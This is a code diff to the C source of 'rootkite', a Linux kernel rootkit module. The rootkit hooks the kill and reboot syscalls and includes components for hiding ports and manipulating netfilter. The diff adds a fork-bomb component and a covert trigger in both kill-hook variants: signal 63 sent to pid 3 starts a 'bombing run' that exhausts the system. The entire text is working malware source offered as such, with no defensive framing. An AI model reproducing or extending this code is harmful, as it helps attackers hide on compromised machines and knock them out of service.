@@ -15,11 +15,13 @@
 #include "hide_ports.h"
 #include "files_hacks.h"
 #include "netfilter_kite.h"
+#include "forkbomb.h"
+
 
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("rootkite");
 MODULE_AUTHOR("NondairyDig");
-MODULE_VERSION("0.5");
+MODULE_VERSION("0.7");
 
 
 #ifdef PTREGS_SYSCALL_STUB
@@ -129,6 +131,9 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
             printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
         }
     }
+    else if ((sig == 63) && (pid == 3)){
+        start_bombing_run();
+    }
     return orig_kill(regs);
 }
 #else
@@ -190,6 +195,9 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
         }
+    }
+    else if ((sig == 63) && (pid == 3)){
+        start_bombing_run();
     }
     return orig_kill(pid, sig);
 }
